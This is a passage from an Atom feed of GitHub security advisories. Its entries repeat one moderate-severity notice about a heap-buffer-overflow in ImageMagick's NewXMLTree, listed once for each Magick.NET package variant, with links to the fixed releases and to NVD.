<li><a href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/advisories/GHSA-gc62-2v5p-qpmp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-17T17:12:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-OpenMP-x64] ImageMagick has a heap-buffer-overflow in NewXMLTree which could result in crash]]></title>
        <id>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</id>
        <link href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp"/>
        <updated>2026-03-18T21:51:15.000Z</updated>
        <content type="html"><![CDATA[<p>The NewXMLTree method contains a bug that could result in a crash due to an out of write bounds of a single zero byte.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17">https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0">https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32636">https://nvd.nist.gov/vuln/detail/CVE-2026-32636</a></li>
<li><a href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/advisories/GHSA-gc62-2v5p-qpmp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-17T17:12:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-OpenMP-arm64] ImageMagick has a heap-buffer-overflow in NewXMLTree which could result in crash]]></title>
        <id>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</id>
        <link href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp"/>
        <updated>2026-03-18T21:51:15.000Z</updated>
        <content type="html"><![CDATA[<p>The NewXMLTree method contains a bug that could result in a crash due to an out of write bounds of a single zero byte.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17">https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0">https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32636">https://nvd.nist.gov/vuln/detail/CVE-2026-32636</a></li>
<li><a href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/advisories/GHSA-gc62-2v5p-qpmp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-17T17:12:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-AnyCPU] ImageMagick has a heap-buffer-overflow in NewXMLTree which could result in crash]]></title>
        <id>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</id>
        <link href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp"/>
        <updated>2026-03-18T21:51:15.000Z</updated>
        <content type="html"><![CDATA[<p>The NewXMLTree method contains a bug that could result in a crash due to an out of write bounds of a single zero byte.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17">https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0">https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32636">https://nvd.nist.gov/vuln/detail/CVE-2026-32636</a></li>
<li><a href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/advisories/GHSA-gc62-2v5p-qpmp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-17T17:12:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-x86] ImageMagick has a heap-buffer-overflow in NewXMLTree which could result in crash]]></title>
        <id>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</id>
        <link href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp"/>
        <updated>2026-03-18T21:51:15.000Z</updated>
        <content type="html"><![CDATA[<p>The NewXMLTree method contains a bug that could result in a crash due to an out of write bounds of a single zero byte.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-gc62-2v5p-qpmp</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17">https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.2-17</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0">https://github.com/dlemstra/Magick.NET/releases/tag/14.11.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32636">https://nvd.nist.gov/vuln/detail/CVE-2026-32636</a></li>
<li><a href="https://github.com/advisories/GHSA-gc62-2v5p-qpmp">https://github.com/advisories/GHSA-gc62-2v5p-qpmp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gc62-2v5p-qpmp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-17T17:12:34.000Z</published>
    </entry>
</feed>